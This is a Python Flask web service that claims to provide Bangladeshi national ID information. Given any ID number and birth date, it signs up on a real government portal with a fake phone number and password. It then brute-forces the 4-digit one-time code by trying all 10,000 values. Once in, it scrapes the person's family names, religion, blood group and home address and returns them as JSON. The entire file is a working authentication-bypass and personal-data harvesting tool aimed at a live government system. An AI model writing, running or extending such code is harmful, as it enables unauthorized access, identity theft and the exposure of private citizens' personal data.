from flask import Flask, request, jsonify
import requests
import random
import string
import re
import os
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

# --- Utilities for HTML Extraction ---
def extract_selected_option(html_content, field_id):
    pattern = rf'<select[^>]*id="{field_id}"[^>]*>.*?<option[^>]*selected[^>]*>(.*?)</option>'
    match = re.search(pattern, html_content, re.DOTALL)
    if match:
        return re.sub(r'<[^>]*>', '', match.group(1)).strip()
    return ""

def extract_fields(html_content, ids):
    result = {}
    for field_id in ids:
        match = re.search(rf'<input[^>]*id="{field_id}"[^>]*value="([^"]*)"', html_content)
        result[field_id] = match.group(1) if match else ""
    return result

def enrich_data(contractor_name, html_content, result, nid, dob):
    gender = ""
    if re.search(r'<input[^>]*id="maleGender"[^>]*checked', html_content):
        gender = "Male"
    elif re.search(r'<input[^>]*id="femaleGender"[^>]*checked', html_content):
        gender = "Female"
    elif re.search(r'<input[^>]*id="otherGender"[^>]*checked', html_content):
        gender = "Other"
    religion = extract_selected_option(html_content, "religion")
    occupation = extract_selected_option(html_content, "occupation")
    education = extract_selected_option(html_content, "education")
    blood_group = extract_selected_option(html_content, "bloodGroup")
    marital_status = extract_selected_option(html_content, "maritalStatus")
    mapped = {
        "nameBangla": contractor_name,
        "nameEnglish": "",
        "nationalId": nid,
        "dateOfBirth": dob,
        "fatherName": result.get("fatherName", ""),
        "motherName": result.get("motherName", ""),
        "spouseName": result.get("spouseName", ""),
        "gender": gender,
        "religion": religion,
        "occupation": occupation,
        "education": education,
        "bloodGroup": blood_group,
        "maritalStatus": marital_status,
        "birthPlace": result.get("nidPerDistrict", ""),
        "nationality": result.get("nationality", ""),
        "division": result.get("nidPerDivision", ""),
        "district": result.get("nidPerDistrict", ""),
        "upazila": result.get("nidPerUpazila", ""),
        "union": result.get("nidPerUnion", ""),
        "village": result.get("nidPerVillage", ""),
        "ward": result.get("nidPerWard", ""),
        "zip_code": result.get("nidPerZipCode", ""),
        "post_office": result.get("nidPerPostOffice", "")
    }
    address_parts = [
        f"বাসা/হোল্ডিং: {result.get('nidPerHolding', '-')}",
        f"গ্রাম/রাস্তা: {result.get('nidPerVillage', '')}",
        f"মৌজা/মহল্লা: {result.get('nidPerMouza', '')}",
        f"ইউনিয়ন ওয়ার্ড: {result.get('nidPerUnion', '')}",
        f"ডাকঘর: {result.get('nidPerPostOffice', '')} - {result.get('nidPerZipCode', '')}",
        f"উপজেলা: {result.get('nidPerUpazila', '')}",
        f"জেলা: {result.get('nidPerDistrict', '')}",
        f"বিভাগ: {result.get('nidPerDivision', '')}"
    ]
    address_line = ", ".join([p for p in address_parts if p.split(": ")[1]])
    mapped["permanentAddress"] = address_line
    mapped["presentAddress"] = address_line
    return mapped

def random_mobile(prefix="017"):
    return prefix + f"{random.randint(0, 99999999):08d}"

def random_password():
    return "#" + random.choice(string.ascii_uppercase) + f"{random.randint(0, 99)}"

# --- OTP Strategies ---
def generate_smart_otps(nid, dob):
    return [f"{i:04d}" for i in range(100)]

# --- Cookie/Session Setup ---
def get_cookie(data):
    url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor"
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    res = session.post(url, data=data, allow_redirects=False, timeout=30)
    if res.status_code == 302 and 'mov-verification' in res.headers.get('Location', ''):
        return session
    else:
        raise Exception(f"Bypass Failed - Status: {res.status_code}, Detail: {res.text}")

def try_otp(session, otp):
    url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step"
    data = {
        "otpDigit1": otp[0],
        "otpDigit2": otp[1],
        "otpDigit3": otp[2],
        "otpDigit4": otp[3]
    }
    try:
        res = session.post(url, data=data, allow_redirects=False, timeout=10)
        if res.status_code == 302 and "form" in res.headers.get('Location', ''):
            return otp
    except Exception:
        pass
    return None

def try_batch(session, otp_batch):
    # Use only 2 threads, split into tiny batches for low RAM!
    with ThreadPoolExecutor(max_workers=2) as executor:
        future_to_otp = {executor.submit(try_otp, session, otp): otp for otp in otp_batch}
        for future in as_completed(future_to_otp):
            try:
                result = future.result()
                if result:
                    executor.shutdown(cancel_futures=True)
                    return result
            except Exception:
                continue
    return None

def fetch_form_data(session):
    url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"
    res = session.get(url, timeout=30)
    return res.text if res.status_code == 200 else ""

# --- API Endpoints ---
@app.route("/")
def home():
    return jsonify({
        "status": "Flask app is running!",
        "message": "Bangladeshi NID Information Service",
        "usage": "GET /get-info?nid=YOUR_NID&dob=YOUR_DOB",
        "example_random": "/get-info?nid=1234567890&dob=01-01-2000",
        "example_smart": "/get-info?nid=1234567890&dob=01-01-2000&strategy=smart",
        "notes": [
            "Replace YOUR_NID and YOUR_DOB with actual values",
            "Use &strategy=random or &strategy=smart (default is random)",
            "Smart strategy will try the most likely OTPs first (experimental)",
            "Processing can take a few seconds"
        ]
    })

@app.route("/health")
def health():
    return jsonify({"status": "healthy", "platform": "standard"})

@app.route("/get-info", methods=["GET"])
def get_info():
    try:
        nid = request.args.get("nid")
        dob = request.args.get("dob")
        strategy = request.args.get("strategy", "random")

        if not nid or not dob:
            return jsonify({"error": "NID and DOB are required"}), 400

        batch_size = 10  # Lowered for low RAM
        otp_range = [f"{i:04d}" for i in range(10000)]
        otp_list = generate_smart_otps(nid, dob) if strategy == "smart" else otp_range

        data = {
            "nidNumber": nid,
            "email": "",
            "mobileNo": random_mobile(),
            "dateOfBirth": dob,
            "password": random_password(),
            "confirm_password": random_password(),
            "next1": ""
        }

        try:
            session = get_cookie(data)
        except Exception as e:
            return jsonify({"error": str(e), "type": type(e).__name__, "stage": "get_cookie"}), 500

        random.shuffle(otp_list)
        found_otp = None
        for i in range(0, len(otp_list), batch_size):
            batch = otp_list[i:i+batch_size]
            try:
                found_otp = try_batch(session, batch)
            except Exception:
                continue
            if found_otp:
                break
            time.sleep(1)  # Prevent RAM spike by pausing between batches

        if found_otp:
            html_content = fetch_form_data(session)
            ids = [
                "contractorName", "fatherName", "motherName", "spouseName", "nidPerDivision",
                "nidPerDistrict", "nidPerUpazila", "nidPerUnion", "nidPerVillage", "nidPerWard",
                "nidPerZipCode", "nidPerPostOffice", "nidPerHolding", "nidPerMouza"
            ]
            result = extract_fields(html_content, ids)
            mapped_data = enrich_data(result.get("contractorName", ""), html_content, result, nid, dob)
            mapped_data["foundOTP"] = found_otp
            return jsonify(mapped_data), 200
        else:
            total_tried = len(otp_list)
            return jsonify({
                "error": "OTP not found",
                "tried": total_tried,
                "suggestions": [
                    "Try again later (OTP may expire)",
                    "Check your NID and DOB for mistakes",
                    "Contact official support if problem persists"
                ]
            }), 404

    except Exception as e:
        return jsonify({"error": str(e), "type": type(e).__name__}), 500

@app.route("/debug", methods=["GET"])
def debug():
    nid = request.args.get("nid", "1234567890")
    dob = request.args.get("dob", "01-01-2000")
    try:
        url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor"
        data = {
            "nidNumber": nid,
            "email": "",
            "mobileNo": random_mobile(),
            "dateOfBirth": dob,
            "password": random_password(),
            "confirm_password": random_password(),
            "next1": ""
        }
        session = requests.Session()
        res = session.post(url, data=data, allow_redirects=False, timeout=30)
        redirect_location = res.headers.get("Location", "")
        return jsonify({
            "connectivity": "OK" if res.status_code == 302 else "Fail",
            "redirect_location": redirect_location,
            "status_code": res.status_code
        })
    except Exception as e:
        return jsonify({"error": str(e), "type": type(e).__name__}), 500

# --- Platform compatibility ---
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
